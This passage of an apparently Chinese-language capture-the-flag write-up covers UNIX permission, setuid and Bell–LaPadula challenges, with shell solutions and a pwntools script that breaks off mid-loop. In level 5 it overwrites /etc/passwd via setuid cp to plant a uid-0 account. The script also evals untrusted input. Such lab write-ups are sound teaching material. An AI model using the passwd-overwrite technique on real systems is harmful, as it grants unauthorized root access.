生成一个新用户hack，其登录口令为hack</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cp</span> passwd /etc/passwd</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">su - hack</span><br></code></pre></td></tr></table></figure>

<h3 id="challenge"><a href="#challenge" class="headerlink" title="challenge"></a>challenge</h3><p>In this series of challenges, you will be working with various access control systems.<br>Break the system to get the flag.</p>
<h4 id="level1-2"><a href="#level1-2" class="headerlink" title="level1"></a>level1</h4><blockquote>
<p>Flag owned by you with different permissions</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will work with different UNIX permissions on the flag.<br>The flag file will be owned by you and have 400 permissions.<br><br>Before:<br>-r-------- 1 root root 58 Sep  1 07:26 /flag<br>After:<br>-r-------- 1 hacker root 58 Sep  1 07:26 /flag<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /flag</span><br></code></pre></td></tr></table></figure>

<h4 id="level2-2"><a href="#level2-2" class="headerlink" title="level2"></a>level2</h4><blockquote>
<p>Flag owned by you with different permissions</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will work with different UNIX permissions on the flag.<br>The flag file will be owned by root, group as you, and have 040 permissions.<br><br>Before:<br>-r-------- 1 root root 58 Sep  1 07:27 /flag<br>After:<br>----r----- 1 root hacker 58 Sep  1 07:27 /flag<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /flag</span><br></code></pre></td></tr></table></figure>

<h4 id="level3-2"><a href="#level3-2" class="headerlink" title="level3"></a>level3</h4><blockquote>
<p>Flag owned by you with different permissions</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will work with different UNIX permissions on the flag.<br>The flag file will be owned by you and have 000 permissions.<br><br>Before:<br>-r-------- 1 root root 58 Sep  1 07:36 /flag<br>After:<br>---------- 1 hacker root 58 Sep  1 07:36 /flag<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> 777 /flag</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /flag</span><br></code></pre></td></tr></table></figure>

<h4 id="level4-2"><a href="#level4-2" class="headerlink" title="level4"></a>level4</h4><blockquote>
<p>How does SETUID work?</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will work understand how the SETUID bit for UNIX permissions works.<br>What if /bin/cat had the SETUID bit set?<br><br>Before:<br>-rwxr-xr-x 1 root root 43416 Sep  5  2019 /bin/cat<br>After:<br>-rwsr-xr-x 1 root root 43416 Sep  5  2019 /bin/cat<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /flag</span><br></code></pre></td></tr></table></figure>

<h4 id="level5-2"><a href="#level5-2" class="headerlink" title="level5"></a>level5</h4><blockquote>
<p>How does SETUID and cp work?</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will work understand how the SETUID bit for UNIX permissions works.<br>What if /bin/cp had the SETUID bit set?<br>Hint: Look into how cp will deal with different permissions.<br>Another Hint: check the man page for cp, any options in there that might help?<br><br>Before:<br>-rwxr-xr-x 1 root root 153976 Sep  5  2019 /bin/cp<br>After:<br>-rwsr-xr-x 1 root root 153976 Sep  5  2019 /bin/cp<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /etc/passwd &gt; passwd</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">openssl passwd -1 -salt z hack</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;hack:$1$z<span class="hljs-variable">$eN1X4Y0BpzcYM5USaVCR</span>.0:0:0::/root:/bin/shell&quot;</span> &gt;&gt; passwd</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cp</span> passwd /etc/passwd</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">su - hack</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /flag</span><br></code></pre></td></tr></table></figure>

<h4 id="level6-2"><a href="#level6-2" class="headerlink" title="level6"></a>level6</h4><blockquote>
<p>Flag owned by a different group</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will work with different UNIX permissions on the flag.<br>The flag file is owned by root and a new group.<br>Hint: Search for how to join a group with a password.<br><br>Before:<br>-r-------- 1 root root 58 Sep  1 07:16 /flag<br>After:<br>----r----- 1 root group_yjtqrzub 58 Sep  1 07:16 /flag<br>The password for group_yjtqrzub is: swxryfxa<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">newgrp group_yjtqrzub <span class="hljs-comment"># 输入密码 swxryfxa</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">groups</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /flag</span><br></code></pre></td></tr></table></figure>

<h4 id="level7-2"><a href="#level7-2" class="headerlink" title="level7"></a>level7</h4><blockquote>
<p>Flag owned by you with different permissions, multiple users</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will work understand how UNIX permissions works with multiple users.<br>You&#x27;ll also be given access to various user accounts, use su to switch between them.<br><br>Before:<br>-r-------- 1 root root 58 Sep  1 07:38 /flag<br>Created user user_iiwybckt with password ghvxdqze<br>After:<br>-------r-- 1 hacker root 58 Sep  1 07:38 /flag<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">su user_iiwybckt <span class="hljs-comment"># 输入密码 ghvxdqze</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /flag</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">or</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> 777 /flag</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /flag</span><br></code></pre></td></tr></table></figure>

<h4 id="level8-2"><a href="#level8-2" class="headerlink" title="level8"></a>level8</h4><blockquote>
<p>Flag owned by other users</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will work understand how UNIX permissions works with multiple users.<br>You&#x27;ll also be given access to various user accounts, use su to switch between them.<br><br>Before:<br>-r-------- 1 root root 58 Sep  1 07:39 /flag<br>Created user user_rhxpgtwj with password tyfbecia<br>After:<br>-r-------- 1 user_rhxpgtwj root 58 Sep  1 07:39 /flag<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">su user_rhxpgtwj <span class="hljs-comment"># 输入密码 tyfbecia</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /flag</span><br></code></pre></td></tr></table></figure>

<h4 id="level9-2"><a href="#level9-2" class="headerlink" title="level9"></a>level9</h4><blockquote>
<p>Flag owned by other users</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will work understand how UNIX permissions works with multiple users.<br>You&#x27;ll also be given access to various user accounts, use su to switch between them.<br><br>Before:<br>-r-------- 1 root root 58 Sep  1 07:42 /flag<br>Created user user_cazgcldr with password kifrychf<br>After:<br>----r----- 1 root user_cazgcldr 58 Sep  1 07:42 /flag<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">su user_cazgcldr <span class="hljs-comment"># 输入密码 kifrychf</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /flag</span><br></code></pre></td></tr></table></figure>

<h4 id="level10-2"><a href="#level10-2" class="headerlink" title="level10"></a>level10</h4><blockquote>
<p>Flag owned by a group</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will work understand how UNIX permissions works with multiple users.<br>You&#x27;ll also be given access to various user accounts, use su to switch between them.<br>Hint: How can you tell which user is in what group?<br><br>Before:<br>-r-------- 1 root root 58 Sep  1 07:43 /flag<br>Created user user_vcrwcfed with password mooryvsi<br>Created user user_nupwlgln with password snmihyet<br>Created user user_xocpstyf with password wvmxkawk<br>Created user user_jodemick with password wkfiqzmw<br>Created user user_jfhyfzcm with password cbrrtkhw<br>Created user user_jlvxtelf with password ezprzexf<br>Created user user_dkajakjt with password prdldnkc<br>Created user user_hlkosnol with password fbrushep<br>Created user user_qsamltgz with password yaknjraz<br>Created user user_gyrkocsy with password fskyzktv<br>After:<br>----r----- 1 root group_nkp 58 Sep  1 07:43 /flag<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /etc/group</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">su xxx</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /flag</span><br></code></pre></td></tr></table></figure>

<h4 id="level11-2"><a href="#level11-2" class="headerlink" title="level11"></a>level11</h4><blockquote>
<p>Find the flag using multiple users</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will work understand how UNIX permissions for directories work with multiple users.<br>You&#x27;ll be given access to various user accounts, use su to switch between them.<br><br>Created user user_betcpnye with password dkhiqvyi<br>Created user user_qydwicsg with password gnaoedja<br>A copy of the flag has been placed somewhere in /tmp:<br>total 40<br>drwxrwxrwt 1 root   root          4096 Sep  1 07:45 .<br>drwxr-xr-x 1 root   root          4096 Sep  1 07:45 ..<br>-rw-rw-r-- 1 root   root             4 Aug  5 23:25 .cc.txt<br>-rw-r--r-- 1 root   root            55 Sep  1 01:16 .crates.toml<br>-rw-r--r-- 1 root   root           453 Sep  1 01:16 .crates2.json<br>drwxr-xr-x 2 hacker hacker        4096 Sep  1 07:45 .dojo<br>drwxr-xr-x 2 root   root          4096 Sep  1 01:16 bin<br>drwxr-xr-x 1 root   root          4096 Aug  5 23:22 hsperfdata_root<br>drwx------ 2    104           105 4096 Aug 27 04:47 tmp.gzrsgdiMSN<br>dr-xr-x--x 2 root   user_betcpnye 4096 Sep  1 07:45 tmpr_j9uk3r<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">su user_betcpnye</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> /tmp/tmpr_j9uk3r</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">ls</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">su user_qydwicsg</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /tmp/tmpr_j9uk3r/xxx</span><br></code></pre></td></tr></table></figure>

<h4 id="level12-2"><a href="#level12-2" class="headerlink" title="level12"></a>level12</h4><blockquote>
<p>Find the flag using multiple users</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will work understand how UNIX permissions for directories work with multiple users.<br>You&#x27;ll be given access to various user accounts, use su to switch between them.<br><br>Created user user_wavnhyls with password jnfksrwp<br>Created user user_ocqiyufq with password vmljvdoc<br>Created user user_npddlxea with password rtdytofy<br>A copy of the flag has been placed somewhere in /tmp:<br>total 40<br>drwxrwxrwt 1 root   root          4096 Sep  1 07:48 .<br>drwxr-xr-x 1 root   root          4096 Sep  1 07:47 ..<br>-rw-rw-r-- 1 root   root             4 Aug  5 23:25 .cc.txt<br>-rw-r--r-- 1 root   root            55 Sep  1 01:16 .crates.toml<br>-rw-r--r-- 1 root   root           453 Sep  1 01:16 .crates2.json<br>drwxr-xr-x 2 hacker hacker        4096 Sep  1 07:47 .dojo<br>drwxr-xr-x 2 root   root          4096 Sep  1 01:16 bin<br>drwxr-xr-x 1 root   root          4096 Aug  5 23:22 hsperfdata_root<br>drwx------ 2    104           105 4096 Aug 27 04:47 tmp.gzrsgdiMSN<br>dr-xr-x--x 3 root   user_wavnhyls 4096 Sep  1 07:48 tmp9wu15dcc<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">su user_wavnhyls</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> /tmp/tmp9wu15dcc</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">ls</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">su xxx-2</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> /tmp/tmpxxx/tmpxxx</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">ls</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">su xxx-3</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /tmp/tmpxxx/tmpxxx/xxx</span> <br></code></pre></td></tr></table></figure>

<h4 id="level13-2"><a href="#level13-2" class="headerlink" title="level13"></a>level13</h4><blockquote>
<p>One Mandatory Access Control question without categories</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you&#x27;ll be answering questions about the standard Bell–LaPadula model of Mandatory Access Control.<br><br>Answer the question about the model to get the flag.<br><br><br>In this challenge, your goal is to answer 1 questions correctly in 120 seconds about the following Mandatory Access Control (MAC) system:<br>4 Levels (first is highest aka more sensitive):<br>TS<br>S<br>C<br>UC<br>Q 1. Can a Subject with level UC read an Object with level UC?<br>yes<br>Correct!<br>Congratulations, you solved this challenge!<br><br></code></pre></td></tr></table></figure>

<h4 id="level14-1"><a href="#level14-1" class="headerlink" title="level14"></a>level14</h4><blockquote>
<p>Five Mandatory Access Control questions without categories</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this series of challenges, you will be working with various access control systems.<br>Break the system to get the flag.<br><br><br>In this challenge you&#x27;ll be answering questions about the standard Bell–LaPadula model of Mandatory Access Control.<br><br>Answer the questions about the model to get the flag.<br><br><br>In this challenge, your goal is to answer 5 questions correctly in 120 seconds about the following Mandatory Access Control (MAC) system:<br>4 Levels (first is highest aka more sensitive):<br>TS<br>S<br>C<br>UC<br>Q 1. Can a Subject with level S write an Object with level S?<br>yes<br>Correct!<br>Q 2. Can a Subject with level S read an Object with level UC?<br>yes<br>Correct!<br>Q 3. Can a Subject with level C write an Object with level S?<br>yes<br>Correct!<br>Q 4. Can a Subject with level S write an Object with level TS?<br>yes<br>Correct!<br>Q 5. Can a Subject with level TS read an Object with level TS?<br>yes<br>Correct!<br>Congratulations, you solved this challenge!<br><br></code></pre></td></tr></table></figure>

<h4 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h4><blockquote>
<p>One Mandatory Access Control question with categories</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you&#x27;ll be answering questions about the category-based Bell–LaPadula model of Mandatory Access Control.<br><br>Answer the question about the model to get the flag.<br><br><br>In this challenge, your goal is to answer 1 questions correctly in 120 seconds about the following Mandatory Access Control (MAC) system:<br>4 Levels (first is highest aka more sensitive):<br>TS<br>S<br>C<br>UC<br>4 Categories:<br>NUC<br>NATO<br>UFO<br>ACE<br>Q 1. Can a Subject with level UC and categories &#123;UFO&#125; read an Object with level UC and categories &#123;NATO, UFO, ACE&#125;?<br>no<br>Correct!<br>Congratulations, you solved this challenge!<br></code></pre></td></tr></table></figure>

<h4 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h4><blockquote>
<p>Five Mandatory Access Control questions with categories</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you&#x27;ll be answering questions about the category-based Bell–LaPadula model of Mandatory Access Control.<br><br>Answer the questions about the model to get the flag.<br><br><br>In this challenge, your goal is to answer 5 questions correctly in 120 seconds about the following Mandatory Access Control (MAC) system:<br>4 Levels (first is highest aka more sensitive):<br>TS<br>S<br>C<br>UC<br>4 Categories:<br>ACE<br>NATO<br>NUC<br>UFO<br>Q 1. Can a Subject with level C and categories &#123;NATO, UFO&#125; write an Object with level C and categories &#123;ACE, UFO&#125;?<br>no<br>Correct!<br>Q 2. Can a Subject with level UC and categories &#123;NATO, UFO&#125; write an Object with level UC and categories &#123;ACE, NATO, UFO&#125;?<br>yes<br>Correct!<br>Q 3. Can a Subject with level C and categories &#123;NATO, NUC, UFO&#125; write an Object with level TS and categories &#123;ACE, NATO&#125;?<br>no<br>Correct!<br>Q 4. Can a Subject with level UC and categories &#123;NUC&#125; write an Object with level TS and categories &#123;NUC&#125;?<br>yes<br>Correct!<br>Q 5. Can a Subject with level TS and categories &#123;NATO, NUC&#125; write an Object with level TS and categories &#123;NATO&#125;?<br>no<br>Correct!<br>Congratulations, you solved this challenge!<br></code></pre></td></tr></table></figure>

<h4 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h4><blockquote>
<p>Automate answering 20 Mandatory Access Control questions with categories in one second</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you&#x27;ll be answering many questions about the category-based Bell–LaPadula model of Mandatory Access Control.<br><br>Hint: Use pwntools to interact with this process and answer the questions.<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> re<br><br>p = process(<span class="hljs-string">&quot;/challenge/run&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;system:\n&#x27;</span>)<br><br>level_line = p.recvline()<br>level_number = <span class="hljs-built_in">int</span>(level_line.split(<span class="hljs-string">b&#x27; &#x27;</span>)[<span class="hljs-number">0</span>])<br>level = &#123;&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,level_number):<br>    level[p.recvline()[:-<span class="hljs-number">1</span>].decode()] = i<br><br>Categories_line = p.recvline()<br>Categories_number = <span class="hljs-built_in">int</span>(Categories_line.split(<span class="hljs-string">b&#x27; &#x27;</span>)[<span class="hljs-number">0</span>])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,Categories_number):<br>    Cur_Categories = p.recvline()[:-<span class="hljs-number">1</span>].decode()<br>    <span class="hljs-built_in">exec</span>(Cur_Categories+<span class="hljs-string">f&quot; = <span class="hljs-subst">&#123;i&#125;</span>&quot;</span>)<br><br>pattern = <span class="hljs-string">r&quot;(?:Can a Subject with level )(.*)(?: and categories )(&#123;.*&#125;)(?: )(.*)(?: an Object with level )(.*)(?: and categories )(&#123;.*&#125;)?&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">judge</span>(<span class="hljs-params">q</span>):<br>    res = re.findall(pattern,q.decode())<br>    method = res[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>]<br>    level1 = res[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]<br>    level2 = res[<span class="hljs-number">0</span>][<span class="hljs-number">3</span>]<br>    cate1 = <span class="hljs-built_in">set</span>(<span class="hljs-built_in">eval</span>(res[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]))<br>    cate2 = <span class="hljs-built_in">set</span>(<span class="hljs-built_in">eval</span>(res[<span class="hljs-number">0</span>][<span class="hljs-number">4</span>]))<br><br>    <span class="hljs-keyword">if</span>(method == <span class="hljs-string">&#x27;read&#x27;</span>):<br>        <span class="hljs-keyword">if</span> level[level1] &gt; level[level2]:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> cate2.issubset(cate1):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">if</span> level[level1] &lt; level[level2]:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> cate1.issubset(cate2):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    q = p.recvline()<br>    <span class="hljs-built_in">print</span>(q.decode(),end = <span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Congratulations&#x27;</span> <span class="hljs-keyword">in</span> q:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> judge(q):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;yes&#x27;</span>)<br>        p.sendline(<span class="hljs-string">b&#x27;yes&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;no&#x27;</span>)<br>        